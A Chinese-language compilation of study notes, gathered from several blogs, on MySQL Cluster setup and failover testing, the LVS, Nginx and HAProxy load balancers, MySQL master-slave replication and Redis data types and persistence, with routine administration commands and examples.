2015-10-15 14:33:26 15192 [Note] NDB: Cleaning stray tables from database 'ndb_12_fs'

2015-10-15 14:33:26 15192 [Note] NDB: Cleaning stray tables from database 'ndbinfo'

2015-10-15 14:33:26 15192 [Note] NDB: Cleaning stray tables from database 'performance_schema'

2015-10-15 14:33:26 15192 [Note] NDB: Cleaning stray tables from database 'test'

2015-10-15 14:33:26 15192 [Note] NDB Binlog: Wait for first event

2015-10-15 14:33:26 [NdbApi] INFO     -- Flushing incomplete GCI:s < 4554/3

2015-10-15 14:33:26 [NdbApi] INFO     -- Flushing incomplete GCI:s < 4554/3

2015-10-15 14:33:26 15192 [Note] NDB Binlog: starting log at epoch 4554/3

2015-10-15 14:33:26 15192 [Note] NDB Binlog: Got first event

2015-10-15 14:33:26 15192 [Note] NDB Binlog: ndb tables writable

2015-10-15 14:33:26 15192 [Note] NDB Binlog: Startup and setup completed

2015-10-15 14:33:26 15192 [Note] NDB Schema dist: Data node: 11 reports subscribe from node 21, subscriber bitmask 0200000

2015-10-15 14:33:26 15192 [Note] NDB Schema dist: Data node: 12 reports subscribe from node 21, subscriber bitmask 0200000

2015-10-15 14:34:03 15192 [Warning] IP address '10.24.6.170' could not be resolved: Name or service not known

2015-10-15 14:34:56 15192 [Note] NDB Schema dist: Data node: 11 reports subscribe from node 21, subscriber bitmask 00

2015-10-15 14:34:56 15192 [Note] NDB Schema dist: Data node: 12 reports subscribe from node 21, subscriber bitmask 00

2015-10-15 14:35:03 15192 [Note] NDB Schema dist: Data node: 11 reports subscribe from node 21, subscriber bitmask 0200000

2015-10-15 14:35:03 15192 [Note] NDB Schema dist: Data node: 12 reports subscribe from node 21, subscriber bitmask 0200000

2015-10-15 14:41:04 15192 [Note] NDB Schema dist: Data node: 11 failed, subscriber bitmask 00

2015-10-15 14:42:36 15192 [Note] NDB Schema dist: Data node: 12 reports subscribe from node 21, subscriber bitmask 00



8. 测试
8.1. 常规测试
为了让数据表能够在cluster中正常复制，创建数据表时必须指定为ndbcluster引擎（engine=ndb或engine=ndbcluster）。

登录到10.24.64的mysql，然后创建一个新数据库songzi，并创建一个ndbcluster引擎的数据表test（id int，name char（10））,并向表中插入一条数据（0,songzi）。10.24.6.4上的操作及结果如下图：

 

然后登录10.24.6.6的mysql，可查看到数据已同步，并且新建的表及数据也存在。10.24.6.6上的操作及结果如下图：

 



8.2. 模拟NDB节点Crash
终止10.24.6.4上的NDB进程，执行以下指令查看NDB进程情况

ps -ef | grep ndbd

kill 24077

ps -ef | grep ndbd

具体操作及结果见下图：

 

也可以在ndb_mgm管理节点客户端查看到10.24.0.101上的NDB节点已停掉

 

然后分别登录到10.24.6.4和10.24.6.6的mysql，可发现依然能够查询到数据。结果如下图

10.24.6.4

 

10.24.6.6

 

此结果说明测试成功，即当有一个NDB节点Crash后，整个MySQL环境仍可以正常服务。

8.3. 模拟SQL节点Crash
在上10.24.6.4上终止mysqld进程，可执行以下指令：

killall mysqld

也可以在ndb_mgm管理节点客户端查看到10.24.6.4上的SQL节点已停掉

 

登录到10.24.6.6上的mysql，可查看到数据依然存在

 

此结果说明测试成功，及当有一个SQL节点Crash后，整个MySQL-Cluster环境仍可以工作。

至此，整个MySQL-Cluster安装及配置实验已完成。实验结束后，可使用指令shell> ndb_mgm -e shutdown或者ndb_mgm>shutdown来关闭簇中的所有节点。

9. 遇到问题

10. 总结
Mysql cluster是一个统一的共享集群
多mysql同时共享
一个值多份存储，不是像redis那样根据一致性hash分布存储
高并发、高可用、高伸缩性
share nothing架构
通过增加数据节点扩展：通过32个数据节点实现每秒2亿条NoSQL查询，以及通过16个数据节点每秒查询近250万SQL语句
推荐使用lvs + keepalived + mysql cluster 实现集群mysqlMySQL Cluster是一个实时可扩展且符合ACID的事务型内存数据库

支持 SQL
性能对比
支持事务
应用场景
你之前为了解决什么问题使用的什么，为什么选它？
https://www.cnblogs.com/guipeng/p/11876729.html
1. 为什么需要分布式数据库
    随着计算机和信息技术的迅猛发展和普及，行业应用系统的规模迅速扩大，行业应用所产生的数据量量呈爆炸式增长，动辄达到数百TB甚至数百PB规模，已远远超出现有的传统计算技术和信息系统的处理能力，而集中式数据库面对大规模数据处理逐渐表现出其局限性，因此，人们希望寻找一种能快速处理数据和及时响应用户访问的方法，也希望对数据进行集中分析、管理和维护。这已成为现实世界的迫切需求。

    分布式数据库是在集中式数据库的基础上发展起来的，是计算机技术和网络技术结合的产物。分布式数据库是指数据在物理上分布而逻辑上集中管理的数据库系统。物理上分布指的是分布式数据库的数据分布在物理位置不同并由网络连接的节点或站点上；逻辑上集中是指各数据库之间在逻辑上是一个整体，并由统一的数据库管理系统管理。不同的节点分布可以跨不同的机房、城市甚至国家。

    分布式数据库的主要特点如下：

透明性：用户不必关心数据的逻辑分区和物理位置的分布细节，也不必关心重复副本（冗余数据）的一致性问题，同时不必关心在局部场地上数据库支持哪种数据模型。对于系统开发工程师而言，当数据从一个场地移到另一个场地时不必改写应用程序，使用起来如同一个集中式数据库。
数据冗余性：分布式数据库通过冗余实现系统的可靠性、可用性，并改善其性能。多个节点存储数据副本，当某一节点的数据遭到破坏时，冗余的副本可保证数据的完整性；当工作的节点受损害时，可通过心跳等机制进行切换，系统整体不被破坏。还可以通过热点数据的就近分析原则减少网络通信的消耗，加快访问速度，改善性能。
易于扩展性：在分布式数据库中能够方便地通过水平扩展提高系统的整体性能，也能通过垂直扩展来提供性能，扩展并不需要修改系统程序。
自治性：各节点上的数据由本地的DBMS管理，具有自动处理能力，完成本场地的应用或局部应用。
2. MySQL Cluster原理
    MySQL 群集是 MySQL 适合于分布式计算环境的高可用、高冗余版本。它采用了 NDB Cluster 存储引擎，允许在 1 个群集中运行多个 MySQL 服务器。在 MySQL 5.0 及以上的二进制版本中，以及与最新的 Linux 版本兼容的 RPM 包中提供了该存储引擎。

    MySQL 群集是一种技术，该技术允许在无共享的系统中部署“内存中”和“磁盘中”数据库的 Cluster 。通过无共享体系结构，系统能够使用廉价的硬件，而且对软硬件无特殊要求。此外，由于每个组件有自己的内存和磁盘，不存在单点故障。MySQL Cluster 由一组计算机构成，每台计算机上均运行着多种进程，包括 MySQL 服务器，NDB Cluster 的数据节点，管理服务器，以及（可能存在的）专门的数据访问程序。

管理服务器(MGM节点)负责管理 Cluster 配置文件和 Cluster 日志。Cluster 中的每个节点从管理服务器检索配置数据。

当数据节点内出现新的事件时，节点将关于这类事件的信息传输到管理服务器，然后，将这类信息写入 Cluster 日志。

目前能够运行 MySQL Cluster 的操作系统有 Linux、Mac OS X 和 Solaris，最新的版本已经支持 Windows 操作系统。

MySQL 群集的数据节点之间的通信是不加密的，并且需要高速的带宽，所以建议把群集建立在一个高速局域网内，不建议跨网段、跨公网的部署这种系统体系。



 

MySQL 群集分为三种节点：管理节点，数据节点和SQL节点。

管理节点：主要用于管理各个节点，能够通过命令对某个节点进行重启、关闭、启动等操作。也能够监视全部节点的工作状态。

数据节点：主要是对数据的存储，不提供其他的服务。

SQL节点：主要是对外提供SQL功能，类似一台普通的 MySQL Server。

而SQL节点和数据节点可以是同一台机器，也就是说这台机器即是SQL节点也是数据节点。它们只是逻辑关系上的划分，实际部署时，甚至所有的阶段都可以位于同一台物理机器上，只是配置较复杂些。

 

3. MySQL Cluster的优缺点
优点：

99.999 ％的高可用性
快速的自动失效切换
灵活的分布式体系结构，没有单点故障
高吞吐量和低延迟
可扩展性强，支持在线扩容
缺点：

存在很多限制，比如：不支持外键，数据行不能超过8K（不包括BLOB和text中的数据）
部署、管理、配置很复杂
占用磁盘空间大，内存大
备份和恢复不方便
重启的时候，数据节点将数据load到内存需要很长时间
```

## 服务器篇

### 服务器
```
心中有概念，然后足够的实际操作。
Apache
[百度百科介绍
https://baike.baidu.com/item/apache/6265
Nginx
[百度百科介绍
https://baike.baidu.com/item/nginx/3817705
```

## 架构篇

### 负载均衡（Nginx、HAProxy、DNS）
```
https://www.cnblogs.com/yuhaohao/p/12922237.html
LVS是Linux Virtual Server的缩写，意思是Linux虚拟服务器，LVS由用户空间的ipvsadm和内核空间的ipvs组成，ipvsadm用来定义规则，ipvs利用ipvsadm定义的规则工作。

Nginx是一款轻量级的Web服务器/反向代理服务器以及电子邮件(IMAP/POP3)代理服务器，并在一个BSD-like协议下发行。

HAProxy是一个使用C语言编写的自由及开放源代码软件，其提供高可用性、负载均衡以及基于TCP和HTTP的应用程序代理。

通过LVS提供的负载均衡技术和Linux操作系统实现一个高性能、高可用的服务器集群。它具有良好的可靠性、可扩展性和可操作性。从而以低廉的成本实现最优的服务性能。LVS主要特点有以下几个方面：
优势：

高并发连接：LVS基于内核网络层面工作，有超强的承载能力和并发处理能力。单台LVS负载均衡器，可支持上万并发连接。稳定性强：是工作在网络4层之上仅作分发之用，这个特点也决定了它在负载均衡软件里的性能最强、稳定性最好、对内存和CPU资源消耗极低。
成本低廉：硬件负载均衡器少则几万，多则几十万上百万，LVS只需要一台服务器就能免费部署使用，性价比极高。
配置简单：LVS配置非常简单，仅需几行命令即可配置完成，也可以写成脚本进行管理。
支持多种算法：支持多种轮调算法，可根据业务场景灵活调配进行使用，支持多种工作模型：可以根据业务场景使用不同的工作模式来解决生产环境请求处理问题。
应用范围广：因为LVS工作在4层，所以它几乎对所有应用做负载均衡，包括http、数据库、DNS、ftp服务等。
缺点：工作在四层，不支持七层规则修改，机制过于庞大，不适合小规模应用。

名称	解释
ipvsadm	用户空间的命令行工具，用于管理集群服务及集群服务上的RS等
IPVS	工作在内核上的netfilter INPUT HOOK之上的程序，可根据用户定义的集群实现请求转发
VS	Virtual Server、虚拟服务
Director,Balancer	负载均衡器，分发器
RS	Real Server 后端请求处理服务器
CIP	Client IP,客户端IP
VIP	Director Virtual IP,负载均衡器虚拟IP
DIP	Director IP,负载均衡器IP
RIP	Real Server IP,后端请求处理服务器IP
LVS常用的工作模式有：DR(直接路由)模式、TUN模式、以及NAT模式

【此部分参考：https://blog.csdn.net/gui951753/article/details/80316565】

LVS工作原理：

当客户端的请求到达负载均衡器的内核空间时，首先会到达PREROUTING链。
当内核发现请求数据包的目的地址是本机时，将数据包送往INPUT链。
LVS由用户空间的ipvsadm和内核空间的IPVS组成，ipvsadm用来定义规则，IPVS利用ipvsadm定义的规则工作，IPVS工作在INPUT链上,当数据包到达INPUT链时，首先会被IPVS检查，如果数据包里面的目的地址及端口没有在规则里面，那么这条数据包将经过INPUT链送至用户空间，交给用户空间的进程来处理。
如果数据包里面的目的地址及端口在规则里面，那么这条数据报文将被修改目的地址为事先定义好的后端服务器，并送往POSTROUTING链。
最后经由POSTROUTING链发往后端服务器。
优势：

工作在7层网络之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构、它的正则规则比HAProxy更加强大和灵活，这也是它目前广泛流行的主要原因之一，Nginx单凭这点可利用的场合就远远多余LVS了，location使用灵活、应用场合广泛，工作在应用层。
Nginx对网络稳定性的依赖比较小，理论上能ping通就可以进行负载均衡，这个也是它的优势。相反LVS对网络依赖性比较大。
Nginx安装配置简单，测试起来比较方便，它基本能把错误用日志打印出来。LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。
Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。
Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。
Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可以考虑用其作为反向代理加速器。
Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有lighttpd了，不过lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃。
Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多。
缺点：
1.Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点。
2.对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测。不支持Session的直接保持，但能通过ip_hash来解决

Nginx由内核和模块组成。Nginx本身做的工作实际很少，当它接到一个HTTP请求时，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作，因此模块可以看做Nginx真正的劳动工作者。通常一个location中的指令会涉及一个handler模块和多个filter模块（当然，多个location可以复用同一个模块）。
handler模块负责处理请求，完成响应内容的生成，而filter模块对响应内容进行处理。用户根据自己的需要开发的模块都属于第三方模块。正是有了这么多模块的支撑，Nginx的功能才会如此强大。具体的Nginx处理流程：
1.客户端发送HTTP请求
2.Nginx基于配置文件中的位置选择一个合适的处理模块
3.负载均衡模块选择一台后端服务器 (如果有)
4.处理模块进行处理并把输出缓冲放到第一个过滤模块上
5.第一个过滤模块处理后输出给第二个过滤模块
6.然后第二个过滤模块又到第三个
7.依此类推，最后把响应发给客户端。

Nginx目前支持自带3种负载均衡策略：

轮询(rr)：按照轮询（默认）方式进行负载，每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。虽然这种方式简便、成本低廉。但缺点是：可靠性低和负载分配不均衡。
权重(weight)：指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。
upstream westos{
     server 192.168.1.1:80  weight=9;
     server 192.168.1.2:80  weight=1;
}
ip哈希(ip_hash)：上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用ip_hash了，ip_hash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。
# ip_hash： 来自同一个IP的请求会分发到相同的后端服务器
upstream westos{
     ip_hash;
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
fair：这是第三方的策略，按照后端服务器响应时间来分配请求，响应时间短的优先分配。
upstream backend{
	 fair;
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
url_hash：按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。
upstream backend{
     hash $request_uri; 
     hash_method crc32; 
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
优点：

支持两种代理模式：TCP（四层）和HTTP（七层），支持虚拟主机；
支持Session的保持，Cookie的引导；同时支持通过获取指定的url来检测后端服务器的状态。能够补充Nginx的一些缺点。
HAProxy跟LVS类似，本身就只是一款负载均衡软件；单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的。
HAProxy可以对Mysql进行负载均衡，对后端的DB节点进行检测和负载均衡。
HAProxy负载均衡策略非常多，比如：动态加权轮循(Dynamic Round Robin)，加权源地址哈希(Weighted Source Hash)，加权URL哈希和加权参数哈希(Weighted Parameter Hash)
免费开源，稳定性也是非常好，可以与LVS相媲美；
自带强大的监控服务器状态的页面，实际环境中我们结合Nagios进行邮件或短信报警；
HAProxy实现了一种事件驱动, 单一进程模型，此模型支持非常大的并发连接数。多进程或多线程模型受内存限制 、系统调度器限制以及无处不在的锁限制，很少能处理数千并发连接。事件驱动模型因为在有更好的资源和时间管理的用户空间(User-Space) 实现所有这些任务，所以没有这些问题。此模型的弊端是，在多核系统上，这些程序通常扩展性较差。这就是为什么他们必须进行优化以使每个CPU时间片(Cycle)做更多的工作

roundrobin：简单的轮询
static-rr：权重轮询
leastconn：最少连接者优先
source：根据请求源IP,这个跟Nginx的ip_hash机制类似
ri：根据请求的URI
rl_param：表示根据请求的URI参数‘balance url_param’requires an URL parameter name;
hdr(name)：根据HTTP请求头来锁定每一次HTTP请求
rdp-cookie(name)：根据cookie来锁定并哈希每一次TCP请求

```

### 主从复制（MySQL、Redis）
```
https://www.cnblogs.com/yidashi110/p/10274846.html
一、mysql(mariadb)基础
1、基础命令(centos7操作系统下)
复制代码
复制代码
1.启动mysql
systemctl start mariadb 

2.linux客户端连接自己 
mysql -uroot -p -h 127.0.0.1
    -u 用户
    -p 密码验证
    -h 连接的主机地址

3.远程链接mysql服务端
mysql -uroot -p -h 192.168.3.115

4.修改mysql密码
# 修改当前用户的密码
set password = PASSWORD('mariadb123');

# 修改其他用户的密码
set password for 'username'@'host' = PASSWORD('newpassword') 

5.创建mysql用户
create user xiaoming@'%' identified by 'xm666';

6.查询mysql库中的用户信息
use mysql;  # mysql是默认存在的库，储存着用户的信息，密码之类的
select host,user,password from  user;

7.授权语句
给小明这个用户，授予创建数据库的权限
mysql中使用grant命令对账户进行授权，grant命令常见格式如下

grant 权限 on 数据库.表名 to 账户@主机名          对特定数据库中的特定表授权
grant 权限 on 数据库.* to 账户@主机名             对特定数据库中的所有表给与授权
grant 权限1,权限2,权限3 on *.* to 账户@主机名   　对所有库中的所有表给与多个授权
grant all privileges on *.* to 账户@主机名   　　 对所有库和所有表授权所有权限

# 授予小明创建的权限，对于所有的库表生效
grant create  on *.* to xiaoming@"%";

# 创建用户并授予用户只有创建test数据库的权限
grant create  on test.* to xiaoming2@"%"  identified by 'xm2666';

# 授予用户最大的权限，所有的权限
grant all privileges on *.* to username@'%' identified by 'password';

# 刷新权限
flush privileges;  # 刷新使授权立即生效

# 查看用户权限
show grants for 'xiaoming'@'%';

8.移除权限
revoke all privileges on *.* from xiaoming@"%";
复制代码
复制代码
 

2、数据库的备份与恢复
复制代码
复制代码
# 备份
mysqldump -u root -p --all-databases > /tmp/db.sql

# 数据导入，方式有几种
第一种
source /tmp/db.sql;

第二种
mysql -uroot -p < /tmp/db.sql 

第三种
使用navicat工具

第四种，如果你数据量特别大的话
使用第三方工具 xtrabackup
复制代码
复制代码
 

二、mysql主从复制
1、mysql主从复制背景
1.如果你是单点数据库，数据库挂了，你整个项目就挂了

2.如果你是主备数据库，挂了一台主库，我可能还有千千万万个备用的数据库

3.原理
MySQL数据库的主从复制是其自带的功能，主从复制并不是复制磁盘上的数据库文件，而是通过主库的binlog日志复制到需要同步的从服务器上。
在复制的过程中，一台服务器充当主服务器（Master），接收来自用户的内容更新，而一个或多个其他的服务器充当从服务器（slave），接收来自Master上binlog文件的日志内容，解析出SQL，重新更新到Slave，使得主从服务器数据达到一致。

主从复制的逻辑有以下几种
一主一从，单向主从同步模式，只能在Master端写入数据


 

一主多从



 



 

双主主复制逻辑架构，此架构可以在Master1或Master2进行数据写入，或者两端同时写入（特殊设置）


 

4.应用场景
利用复制功能当Master服务器出现问题时，我们可以人工的切换到从服务器继续提供服务，此时服务器的数据和宕机时的数据几乎完全一致。
复制功能也可用作数据备份，但是如果人为的执行drop,delete等语句删除，那么从库的备份功能也就失效了

 

2、mysql主从复制主库的配置步骤
复制代码
复制代码
1.在matser(192.168.3.115)主库上的操作，开启主库功能
# 先把主数据库停了
systemctl stop mariadb 

# 编辑数据库的配置文件 /etc/my.cnf ，写入如下信息
[mysqld]
server-id=6  # 这个server-id只要与你从库的server-id不一样即可
log-bin=master-logbin  # 生成二进制日志，记录数据的变化

# 重启数据库
systemctl start mariadb

2.在主库创建用户，用于同步数据
create user xiaoming@'%' identified by 'xm666';

授予用户，slave从库的身份
grant replication slave on *.* to 'xiaoming'@'%';


3.锁定数据库的库表，禁止写入
这个命令是全局读锁定，执行了命令之后所有库所有表都被锁定只读。一般都是用在数据库联机备份，这个时候数据库的写操作将被阻塞，读操作顺利进行。 
解锁语句是：UNLOCK TABLES;
flush table with read lock;

记录下主库的状态，记录下，日志文件的名字，和位置
show master status; 

4.导出主库的数据
mysqldump -u root -p --all-databases > /tmp/db.sql


5.确保数据导出后，没有数据插入，完毕再查看主库状态

　　show master status;

6.远程传输主库的数据，给从库，进行导入
scp /tmp/db.sql  root@192.168.3.27:/tmp/


7.解锁主库的锁，写入数据，查看从库是否同步
unlock tables;
复制代码
复制代码
 

3、从库slave(192.168.3.27)机器的配置步骤
复制代码
复制代码
1.在从库的 /etc/my.cnf中添加参数，添加只读参数
[mysqld]
server-id=3
read-only=true


2.重启数据库
systemctl restart mariadb 

在从库中导入主库的数据
mysql -uroot -p  <  /tmp/db.sql 


3.一条语句，开启主从之间的复制关系
用root用户，进入mysql数据库，输入命令：
change master to master_host='192.168.3.115',  # 主数据库的ip
master_user='xiaoming',  # 普通用户的用户名
master_password='xm666', # 普通用户的密码
master_log_file='master-logbin.000002',  # 主库show master status;日志文件的名字
master_log_pos=492;  # 主库show master status;记录的位置

4.开启slave同步功能
start slave;

5.检查slave机器的主从是否正确
show slave status\G  查看主从同步是否正确

确保如下两条参数，是yes，即主从复制正确
Relay_Master_Log_File: master-logbin.000002
     Slave_IO_Running: Yes
    Slave_SQL_Running: Yes


6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果
6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果
6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果


7.登录一个普通用户
mysql -u xiaoming -p 

8.此时在主库写入数据，查看从库是否正确同步

9.从库无法写入数据，即为正常

10.完成主从同步，读写分离实验
复制代码
复制代码
 

三、redis基础
redis是一种高级的key：value存储系统，其中value支持五种数据类型
String: 字符串
Hash: 散列
List: 列表
Set: 集合
Sorted Set: 有序集合

 

1、strings类型
操作

复制代码
复制代码
set 　　 设置key
get      获取key
append   追加string
mset     设置多个键值对
mget     获取多个键值对
del      删除key
incr     递增+1
decr     递减-1
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> set name 'dog'  # 设置key
OK
127.0.0.1:6379> get name  # 获取value
"dog"
127.0.0.1:6379> set name 'BigDog'  # 覆盖key
OK
127.0.0.1:6379> get name  # 获取value
"BigDog"
127.0.0.1:6379> append name ' is you'  # 向name这个key追加
(integer) 13
127.0.0.1:6379> get name   # 获取value
"BigDog is you"
127.0.0.1:6379> mset age 18 hight 180 long 18.8  # 一次性设置多个键值对
OK
127.0.0.1:6379> mget age hight long  # 一次性获取多个键的值
1) "18"
2) "180"
3) "18.8"
127.0.0.1:6379> get age  # 获取value
"18"
127.0.0.1:6379> keys *  # 找到所有key
1) "long"
2) "hight"
3) "age"
4) "name"
127.0.0.1:6379> del name  # 删除key
(integer) 1
127.0.0.1:6379> get name  # 获取不存在的value，为nil
(nil)
127.0.0.1:6379> set num 10
OK
127.0.0.1:6379> get num
"10"
127.0.0.1:6379> incr num  # 递增+1
(integer) 11
127.0.0.1:6379> get num
"11"
127.0.0.1:6379> decr num  # 递减-1
(integer) 10
127.0.0.1:6379> get num
"10"
复制代码
复制代码
 

2、list类型
操作

复制代码
复制代码
lpush           从列表左边插
rpush           从列表右边插
lrange          获取一定长度的元素  lrange key  start stop(相当于获取切片的内容)
ltrim           截取一定长度列表
lpop            删除最左边一个元素
rpop            删除最右边一个元素
lpushx/rpushx   key存在则添加值，不存在不处理
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> lpush list1 'a' 'b' 'c' 'd'  # 新建一个list1，从左边放入四个元素
(integer) 4
127.0.0.1:6379> llen list1  # 查看list1的长度
(integer) 4
127.0.0.1:6379> lrange list1 0 -1  # 查看list所有元素
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> rpush list1 'haha'  # 从右边插入haha
(integer) 5
127.0.0.1:6379> lrange list1 0 -1
1) "d"
2) "c"
3) "b"
4) "a"
5) "haha"
127.0.0.1:6379> lpushx list3 'xixi'  # list3存在则添加元素，不存在则不作处理
(integer) 0
127.0.0.1:6379> ltrim list1 0 3  # 截取队列的值，从索引0取到3，删除其余的元素
OK
127.0.0.1:6379> lrange list1 0 -1
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> lpop list1  # 删除左边的第一个
"d"
127.0.0.1:6379> lrange list1 0 -1
1) "c"
2) "b"
3) "a"
127.0.0.1:6379> rpop list1  # 删除右边的第一个
"a"
127.0.0.1:6379> lrange list1 0 -1
1) "c"
2) "b"
复制代码
复制代码
 

3、set集合类型
redis的集合，是一种无序的集合，集合中的元素没有先后顺序，且集合成员是唯一的。

操作

复制代码
复制代码
sadd/srem   添加/删除 元素
sismember   判断是否为set的一个元素
smembers    返回集合所有的成员
sdiff       返回一个集合和其他集合的差异
sinter      返回几个集合的交集
sunion      返回几个集合的并集
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> sadd school class1 class2  # 添加一个名叫school的集合，有2个元素，不加引号就当做字符串处理
(integer) 2
127.0.0.1:6379> smembers school  # 查看集合school成员
1) "class1"
2) "class2"
127.0.0.1:6379> srem school class1  # 删除school的class1成员
(integer) 1
127.0.0.1:6379> smembers school
1) "class2"
127.0.0.1:6379> sismember school class1  # 是否是school的成员，不是返回0，是返回1
(integer) 0
127.0.0.1:6379> sadd school class3  # 给school添加一个新成员
(integer) 1
127.0.0.1:6379> smembers school
1) "class3"
2) "class2"
127.0.0.1:6379> sadd school2 class3 class4  # 添加一个名叫school2的集合，有2个元素
(integer) 1
127.0.0.1:6379> smembers school2
1) "class3"
2) "class4"
127.0.0.1:6379> sdiff school school2  # 找出集合school中有的，而school2中没有的元素
1) "class2"
127.0.0.1:6379> sdiff school2 school  # 找出集合school2中有的，而school中没有的元素
1) "class4"
127.0.0.1:6379> sinter school school2  # 找出school和school2的交集
1) "class3"
127.0.0.1:6379> sunion school school2  # 找出school和school2的并集(自动去重)
1) "class3"
2) "class4"
3) "class2"
复制代码
复制代码
 

4、哈希数据结构
hashes即哈希。哈希是从redis-2.0.0版本之后才有的数据结构。

hashes存的是字符串和字符串值之间的映射，比如一个用户要存储其全名、姓氏、年龄等等，就很适合使用哈希。

操作

复制代码
复制代码
hset    设置散列值
hget    获取散列值
hmset   设置多对散列值
hmget   获取多对散列值
hsetnx  如果散列已经存在，则不设置（防止覆盖key）
hkeys   返回所有keys
hvals   返回所有values
hlen    返回散列包含域（field）的数量
hdel    删除散列指定的域（field）
hexists 判断是否存在
复制代码
复制代码
 

注意

Hash不支持多次嵌套，即
"key": {'field': '不能再对应字典'}

"key": {'field': {...}}   --> 错误 
若想嵌套字典，可以json.dumps后存入，取出数据的时候可以json.loads
 

语法

复制代码
复制代码
hset key field value
结构如下
    key: {
        field1: value1,
        field2: value2,
    }
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> hset school name 'ChinaSchool'  # 创建一个key为school的哈希数据
(integer) 1
127.0.0.1:6379> hget school name  # 获取school的name的值
"ChinaSchool"
127.0.0.1:6379> hmset school age 100 area 2000  # 给school批量设置键值对
OK
127.0.0.1:6379> hmget school name age area  # 批量获取school的键对应的值
1) "ChinaSchool"
2) "100"
3) "2000"
127.0.0.1:6379> hkeys school  # 获取school的所有key
1) "name"
2) "age"
3) "area"
127.0.0.1:6379> hvals school  # 获取school的所有值
1) "ChinaSchool"
2) "100"
3) "2000"
127.0.0.1:6379> hlen school  # 获取school的长度
(integer) 3
127.0.0.1:6379> hexists school name  # 判断school中是否有name这个键，有就返回1，没有就返回0
(integer) 1
127.0.0.1:6379> hdel shcool area  # 删除school中的area键值对
(integer) 1
复制代码
复制代码
 

5、额外的危险操作(慎用)
复制代码
复制代码
获取redis数据库中所有的键(这个不危险)
keys *

删除所有Key，可以使用Redis的flushdb和flushall命令(危险慎用)
# 删除当前数据库中的所有Key
flushdb

# 删除所有数据库中的key
flushall
复制代码
复制代码
 

四、redis发布者订阅者
复制代码
复制代码
发布者：
PUBLISH channel msg
    将信息 message 发送到指定的频道 channel
    
频道  channel  
    自定义频道的名字

订阅者：
SUBSCRIBE channel [channel ...]
    订阅频道，可以同时订阅多个频道

UNSUBSCRIBE [channel ...]
    取消订阅指定的频道, 如果不指定频道，则会取消订阅所有频道

PSUBSCRIBE pattern [pattern ...]
    订阅一个或多个符合给定模式的频道(正则匹配)，每个模式以 * 作为匹配符，
    比如 it* 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)， 
    news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类

PUNSUBSCRIBE [pattern [pattern ...]]
    退订指定的规则, 如果没有参数则会退订所有规则

PUBSUB subcommand [argument [argument ...]]
    查看订阅与发布系统状态

注意：使用发布订阅模式实现的消息队列，当有客户端订阅channel后只能收到后续发布到该频道的消息，之前发送的不会缓存，必须Provider和Consumer同时在线
复制代码
复制代码
 

五、redis数据持久化
redis的缺点：
　　redis数据放在内存中
　　重启服务器丢失数据
　　重启redis服务丢失数据
　　断电丢失数据

为了防止redis数据丢失，进行持久化，将数据，写入到一个文件中

 

1、redis持久化之RDB
redis提供了RDB持久化的功能，这个功能可以将redis在内存中的的状态保存到硬盘中，它可以手动执行。
也可以再redis.conf中配置，定期执行。
RDB持久化产生的RDB文件是一个经过压缩的二进制文件，这个文件被保存在硬盘中，redis可以通过这个文件还原数据库当时的状态。

RDB的原理是
　　基于内存的数据快照
　　定期执行数据快照
　　手动触发数据快照
　　Redis会将数据集的快照dump到dump.rdb文件中
　　可以通过配置文件来修改Redis服务器dump快照的频率

RDB优点：
　　速度快，适合做备份，主从复制就是基于RDB持久化功能实现
　　rdb通过在redis中使用save命令触发 rdb

 

1. 配置rdb数据持久化

复制代码
复制代码
1.在配置文件中，添加rdb持久化参数 
vim redis-6379.conf 
写入如下配置
port 6379           
daemonize yes           
pidfile /data/6379/redis.pid
loglevel notice        
logfile "/data/6379/redis.log"
protected-mode yes
